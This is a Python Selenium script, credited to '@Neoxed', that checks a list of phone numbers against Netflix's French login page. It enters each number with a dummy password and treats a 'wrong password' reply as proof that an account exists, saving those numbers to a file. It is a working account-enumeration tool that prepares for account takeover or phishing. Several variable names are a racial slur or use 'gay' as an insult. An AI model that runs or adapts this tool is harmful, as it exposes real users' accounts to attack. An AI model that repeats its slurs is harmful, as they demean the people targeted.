from lib2to3.pgen2.driver import Driver
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
from colorama import Fore, Back, Style
import os, random, json, easygui, time, threading,ctypes
import time
import colorama




os.system('cls')
os.system(f'title Netflix Valid Phone By @Neoxed ')
validnum, gay = 0,0
driver = webdriver.Chrome()
driver.get("https://www.netflix.com/fr/login")
for line in open("Number.txt"):
    ctypes.windll.kernel32.SetConsoleTitleW(f'Netflix Valid Phone By @Neoxed ~ GOOD : {validnum} ~ BAD : {gay}')
    time.sleep(1.5)
    Phone = line
    Pass = 'JKkjsjfsfhj234243$'
    hq = driver.find_element("xpath",'//*[@id="id_userLoginId"]') 
    hq.send_keys(Phone)
    time.sleep(0.5)
    jxcfjsdf = driver.find_element("xpath",'//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/div[1]/div[1]/div/div') 
    jxcfjsdf.click()
    time.sleep(0.5)
    nigger1 = driver.find_element("xpath",'//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/div[1]/div[1]/div/div/ul/li[71]') 
    nigger1.click()
    proute = driver.find_element("xpath",'//*[@id="id_password"]') 
    proute.send_keys(Pass)  
    pr1oute = driver.find_element("xpath",'//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button')
    pr1oute.click()
    time.sleep(1)
    response = driver.find_element("xpath",'//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]') 
    if response.text=='Mot de passe incorrect. Veuillez réessayer ou réinitialiser votre mot de passe.':
        print('Valid '+Phone)
        f = open("NetflixGood.txt", "a")
        f.write(Phone)
        validnum = validnum+1
    else:
        print('Unvalid '+Phone)
        gay = gay+1
    hq = driver.find_element("xpath",'//*[@id="id_userLoginId"]').clear()
time.sleep(1)
driver.quit()